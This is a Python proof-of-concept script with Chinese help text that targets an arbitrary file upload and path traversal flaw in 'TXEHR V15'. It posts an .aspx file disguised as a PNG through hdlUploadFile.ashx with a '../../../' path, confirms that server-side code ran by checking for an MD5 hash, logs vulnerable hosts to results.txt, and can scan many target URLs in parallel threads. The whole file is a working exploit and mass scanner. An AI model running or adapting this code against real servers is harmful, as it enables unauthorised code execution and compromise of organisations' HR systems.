import argparse
import requests
import concurrent.futures
import sys

def poc(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
        'Content-Type': 'multipart/form-data; boundary=---------------------------45250802924973458471174811279'
    }
    data = """-----------------------------45250802924973458471174811279
Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
Content-Type: image/png

<%@ Page Language="C#"%>
<%
Response.Write(FormsAuthentication.HashPasswordForStoringInConfigFile("123456", "MD5"));
System.IO.File.Delete(Request.PhysicalPath);
%>
-----------------------------45250802924973458471174811279"""

    vulnurl = url + "/MobileService/Web/Handler/hdlUploadFile.ashx?puser=../../../Style/xhs"
    okurl = url + "/Style/xhs.aspx"
    try:
        r = requests.post(vulnurl, headers=headers, data=data, verify=False, timeout=5)
        if r.status_code == 200:
            if 'E10ADC3949BA59ABBE56E057F20F883E' in requests.get(okurl, verify=False, timeout=5).text:
                print('\033[1;31m' + '[+]  成功' + okurl + '\033[0m')
                with open('results.txt', 'a') as f:
                    f.write(okurl + '\n')
            else:
                print('[-] Failed')
        else:
            print('[-] Failed')
    except requests.exceptions.RequestException as e:
        print(f"连接失败: {e}")
def pl(filename):
    with open(filename, 'r',encoding='utf-8') as f:
        urls = [line.strip() for line in f.readlines()]
    return urls

def help():
    helpinfo = """
████████╗██╗  ██╗███████╗██╗  ██╗██████╗     ██╗   ██╗ ██╗███████╗
╚══██╔══╝╚██╗██╔╝██╔════╝██║  ██║██╔══██╗    ██║   ██║███║██╔════╝
   ██║    ╚███╔╝ █████╗  ███████║██████╔╝    ██║   ██║╚██║███████╗
   ██║    ██╔██╗ ██╔══╝  ██╔══██║██╔══██╗    ╚██╗ ██╔╝ ██║╚════██║
   ██║   ██╔╝ ██╗███████╗██║  ██║██║  ██║     ╚████╔╝  ██║███████║
   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝      ╚═══╝   ╚═╝╚══════╝"""
    print(helpinfo)
    print("TXEHR V15".center(66, '*'))
    print(f"[+]{sys.argv[0]} -u --url http://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} -f --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} -h --help 查看更多详细帮助信息")


def main():
    parser = argparse.ArgumentParser(description='TXEHR V15-UploadFile漏洞单批检测脚本')
    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f','--file', type=str, help='批量检测文本')
    parser.add_argument('-t','--thread',type=int, help='线程，默认为5')
    args = parser.parse_args()
    thread = 5
    if args.thread:
        thread = args.thread
    if args.url:
        poc(args.url)
    elif args.file:
        urls = pl(args.file)
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            executor.map(poc, urls)
    else:
        help()
if __name__ == '__main__':
    main()
